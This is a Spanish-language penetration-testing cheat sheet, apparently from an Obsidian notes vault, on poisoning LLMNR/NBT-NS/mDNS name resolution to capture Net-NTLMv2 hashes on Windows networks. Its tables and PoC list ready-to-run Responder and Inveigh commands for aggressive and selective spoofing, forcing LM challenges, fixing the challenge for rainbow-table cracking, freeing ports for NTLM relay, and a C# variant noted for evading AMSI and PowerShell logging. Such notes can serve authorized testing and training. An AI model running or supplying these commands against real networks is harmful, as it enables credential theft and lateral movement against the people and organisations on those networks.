---
aliases:
  - LLMNR Capture
  - Responder Capture
tags:
  - technique/credential-access
  - asset/active-directory
  - env/windows
  - cred/ntlm
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[LLMNR & NBT-NS Poisoning]]"
  - "[[Responder]]"
---
# LLMNR Poisoning - Captura

> Envenenar name resolution (LLMNR/NBT-NS/mDNS) para capturar Net-NTLMv2. Requiere Layer-2 al segmento víctima y puerto 445 libre.

---

## Responder (Linux)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `sudo responder -I eth0` | Captura Net-NTLMv2 (default, todos los servicios) | Captura básica. |
| `sudo responder -I eth0 -wrf` | + WPAD rogue (`-w`), NBT-NS (`-r`), fingerprint OS (`-f`) | Captura agresiva. |
| `sudo responder -I eth0 -A` | **Analyze** mode (pasivo, no responde) | Recon sin envenenar. |
| `sudo responder -I eth0 --lm` | Fuerza challenge LM (hashes tableables) | Cuentas legacy. |
| (config) `Challenge = 1122334455667788` | Challenge fijo → rainbow tables | Editar `Responder.conf`. |
| (config) `SMB = Off` + `HTTP = Off` | Libera puertos para ntlmrelayx | Modo relay → [[LLMNR Poisoning - Cracking y Relay]]. |
^llmnr-capture-responder

> Hashes en `/usr/share/responder/logs/` → formato `user::DOMAIN:challenge:hash:blob`.

## Inveigh (Windows on-host)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `Invoke-Inveigh -ConsoleOutput Y` | Captura desde un shell Windows (analog de Responder) | Ya estás en la red interna (Windows). |
| `Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -Proxy Y -SpooferHostsReply "FILESERVER,SHARE01"` | Spoof selectivo de hosts | Targeting. |
| `Invoke-Inveigh -SpooferIP 0.0.0.0 -ConsoleOutput Y` | Analyze (sin spoof) | Recon. |
| `Get-Inveigh NTLMv2` | Leer hashes capturados | Recolección. |
| `.\InveighZero.exe` | Versión C# (sin PowerShell) | Evasión de AMSI/PS logging. |
^llmnr-capture-inveigh

### PoC Responder

```bash
sudo responder -I eth0 -wrf
# Esperar que una víctima resuelva un nombre inexistente (typo de share, WPAD)
# → user::CORP:1122334455667788:abc...:0101... en los logs
```
